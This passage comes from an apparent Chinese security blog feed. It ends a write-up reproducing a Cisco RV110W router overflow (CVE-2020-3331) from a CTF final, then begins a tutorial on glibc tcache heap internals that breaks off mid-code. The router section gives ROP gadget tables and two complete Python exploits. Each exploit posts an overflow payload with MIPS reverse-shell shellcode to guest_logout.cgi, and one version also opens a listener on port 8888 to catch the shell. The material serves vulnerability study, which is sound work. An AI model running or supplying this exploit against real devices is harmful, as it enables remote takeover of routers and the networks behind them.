     |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x20+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xB8+var_98                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0xF0+var_D0                           |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0x98+var_80                           |  jr    0x98+var_s4($sp)                |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x28+var_8                            |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x28+var_10                           |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x70+var_58                           |  jr    0x70+var_sC($sp)                |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_s0($sp)                |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s10($sp)               |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s0($sp)                |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3020+var_1008                       |  jr    0x3020+var_s24($sp)             |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;mov $t9,$a0&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0003D050  |  move $t9,$a0                                        |  jalr  $a0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>找到两条可用的<code>gadget</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20  |  jalr  $s0  |</span><br><span class="line"></span><br><span class="line">|  0x0003D050  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>算一下溢出到<code>$s0</code>的偏移<code>0x55-0xe4+0xc0 = 0x31</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/28.jpg" class=""><p>再看看<code>shellcode</code>的偏移，暂时还不会在<code>ghidra</code>上用<code>mipsrop</code>的插件，就用了个笨办法，在IDA上先找<code>gadget</code>然后，再来<code>ghidra</code>看偏移，可以看到我们<code>shellcode</code>的偏移为0x18，至此，所有的准备工作已经完成！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/29.jpg" class=""><p>再启动一个终端，监听<code>shellcode</code>中回连的端口，等待反弹<code>shell</code>，完整<code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x31</span> + p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>监听的终端已经看到反弹<code>shell</code>了，泪目~</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/24.png" class=""><p><code>exp</code>的另一种写法，加入<code>pwntools</code>的<code>wait_for_connection</code>模块来实现的，这样就不用开多一个终端监听：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move $t9,$a0 ; jalr $a0 </span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr $s0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#LHOST=192.168.1.101 LPORT=8888 </span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="string">&#x27;b&#x27;</span>*(<span class="number">85</span>-<span class="number">49</span>-<span class="number">4</span>)+p32(jmp_s0)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">pd2 = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:pd1,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        requests.post(url, data=pd2, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#创建一个TCP或UDP套接字以接收数据 </span></span><br><span class="line">thread.start_new_thread(attack,())</span><br><span class="line"><span class="comment">#开始一个新的线程，从attack函数开始运行 </span></span><br><span class="line">io.wait_for_connection()</span><br><span class="line"><span class="comment">#阻塞直到建立连接 </span></span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>被<code>xuanxuan</code>老师带坑的第一个真实的IOT设备，复现之路异常坎坷，但不管怎么样最终还是复现出来了，学到不少知识，不过还有一些细节问题还没解决，后面慢慢看吧！加油，路还很长，任重而道远！</p><h4 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h4><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现</a></p><p><a href="https://www.anquanke.com/post/id/159183">360代码卫士帮助思科公司修复多个产品高危安全漏洞（附详细技术分析）</a></p><p><a href="https://la13x.github.io/2021/08/31/Real-World-Cisco-RV110W/#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">强网杯2020决赛 Cisco RV110W路由器复现</a></p><p><a href="https://xiaoxin.zone/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/">思科路由器RV110W-CVE-2020-3331/CVE-2020-3323漏洞复现</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tache bin attack</title>
      <link href="/2021/10/05/tache-bin-attack/"/>
      <url>/2021/10/05/tache-bin-attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一直以来都是做<code>libc-2.23</code>的堆题，<code>tache</code>也很少涉及，这次来系统的看一下<code>tache</code>这个在<code>libc-2.26</code>版本中新引入的机制到底是怎么样的？它有什么奇妙的玩法？一起来看看吧</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>tache新增了两个结构体，一个是 <strong>tcache_entry</strong> ，另一个是<strong>tcache_perthread_struct</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>有两个特别重要的函数，是关于<code>tache</code>链入和脱链的操作，可以看到<code>tache</code>链入和脱链的检查十分的少，跟<code>fastbin</code>相比真的不多，甚至可以说没有检查…，所以说<code>tache</code>的存在让堆利用更简单了一点，所以说不要怕，它并不可怕！</p><ul><li><code>fastbin</code>有对<code>size</code>进行检查，如果<code>size</code>不同放在同一个链表里面就会报错，<code>tache</code>没得</li><li><code>fastbin</code>有<code>double free</code>检查，在早期的<code>tache</code>中也没有</li></ul><p>链入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脱链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先写个<code>demo</code>简单认识一下<code>tache</code>在<code>bin</code>中的怎么样的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//查看tache</span></span><br><span class="line"><span class="keyword">void</span> *chunk_1,*chunk_2,*chunk_3,*chunk_4;</span><br><span class="line"><span class="keyword">void</span> *chunk_5,*chunk_6,*chunk_7;</span><br><span class="line"></span><br><span class="line">chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">chunk_4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk_5 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">chunk_6 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">chunk_7 = <span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_1);</span><br><span class="line"><span class="built_in">free</span>(chunk_2);</span><br><span class="line"><span class="built_in">free</span>(chunk_3);</span><br><span class="line"><span class="built_in">free</span>(chunk_4);</span><br><span class="line"><span class="built_in">free</span>(chunk_5);</span><br><span class="line"><span class="built_in">free</span>(chunk_6);</span><br><span class="line"><span class="built_in">free</span>(chunk_7);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//宏定义define TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后看<code>bin</code>，我们看到<code>fastbin</code>已经有了一个堆块，说明<code>tache</code>最多只能存放7个堆块，这也是<code>tache</code>可玩的机制之一</p><img src="/2021/10/05/tache-bin-attack/1.png" class=""><p>还记得<code>tcache_perthread_struct</code>这个结构体吗？系统为它分配了一个0x250的堆块来存放这个结构体的内容，我们来看看里面的内容，上面的小框框是记录堆块数量的，从0x20开始一直到0x400，一般的利用也到不了0x400，所以就没展示，下面的大框框就是各个大小的堆块首个堆块的地址，可以对比上图来看</p><img src="/2021/10/05/tache-bin-attack/2.jpg" class=""><p>引用wiki上的一段话</p><blockquote><p>在内存分配的<code>malloc</code>函数中有多处，会将内存块移入<code>tcache</code>中。</p><p>（1）首先，申请的内存块符合<code>fastbin</code>大小时并且在<code>fastbin</code>内找到可用的空闲块时，会把该<code>fastbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（2）其次，申请的内存块符合<code>smallbin</code>大小时并且在<code>smallbin</code>内找到可用的空闲块时，会把该<code>smallbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（3）当在<code>unsorted bin</code>链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到<code>tcache</code>中，继续处理。</p></blockquote><p>其实也很好理解，就是分配的时候会先从<code>tache</code>中取，然后把符合对应大小的堆块的整理到<code>tache</code>中，改一下上面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span 